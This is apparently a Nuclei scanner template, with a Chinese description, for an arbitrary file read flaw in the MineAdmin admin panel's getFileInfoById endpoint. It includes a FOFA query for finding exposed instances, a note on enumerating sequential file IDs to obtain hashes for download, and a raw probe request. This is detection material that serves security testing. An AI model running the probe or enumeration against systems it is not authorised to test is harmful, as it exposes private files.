id: mineadmin-getfileinfobyid-arbitrary-file-read

info:
  name: "MineAdmin getFileInfoById 接口存在任意文件读取漏洞"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: body="MineAdmin"
          MineAdmin后台管理系统基于 Hyperf 框架开发。是一个后台权限管理系统，提供完善的权限体系，让开发者把注意力集中到具体业务当中，降低开发成本，提高项目效率。/system/getFileInfoById?id=处存在任意文件读取漏洞，由于文件 ID 是自增数字，攻击者可通过枚举 ID 读取文件hash,利用/system/showFile接口预览或者利用/system/downloadByHash下载文件。
  tags: MineAdmin

http:
- raw:
  - |
    GET /system/getFileInfoById?id=43 HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
      - 'object_name'
      - 'requestId'
      - 'message'
    condition: and
